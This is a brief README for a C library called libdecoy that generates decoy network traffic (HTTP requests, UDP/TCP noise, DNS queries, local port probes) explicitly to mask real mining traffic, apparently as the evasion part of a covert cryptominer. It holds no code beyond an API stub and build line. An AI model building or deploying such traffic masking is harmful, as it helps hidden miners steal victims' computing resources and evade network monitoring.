# libdecoy

Decoy traffic generator — background noise to mask real mining traffic.

Spawns four background threads:
1. **HTTP decoy** — periodic requests to random targets
2. **Noise** — UDP/TCP noise on random ports
3. **DNS noise** — random DNS queries
4. **Port scan noise** — local port probes

## API

```c
void decoy_start(void);
void decoy_stop(void);
```

## Dependencies

- OpenSSL (`RAND_bytes` for random port selection)

## Build

```
make CC=gcc CFLAGS="-O2 -Wall -Wextra" FEATURE_TLS=1
```
